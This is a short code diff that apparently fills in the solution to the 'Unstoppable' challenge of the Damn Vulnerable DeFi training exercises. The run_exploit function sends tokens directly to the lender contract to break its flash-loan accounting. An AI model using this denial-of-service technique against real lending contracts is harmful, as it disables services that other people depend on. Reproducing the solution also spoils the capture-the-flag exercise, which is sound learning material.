@@ -36,8 +36,10 @@ def before():
 
 
 def run_exploit():
-    # remove pass and add exploit code here
-    pass
+    attacker = get_account(1)
+    DamnValuableToken[0].transfer(
+        UnstoppableLender[0].address, Web3.toWei(1, "ether"), {"from": attacker}
+    )
 
 
 def after():
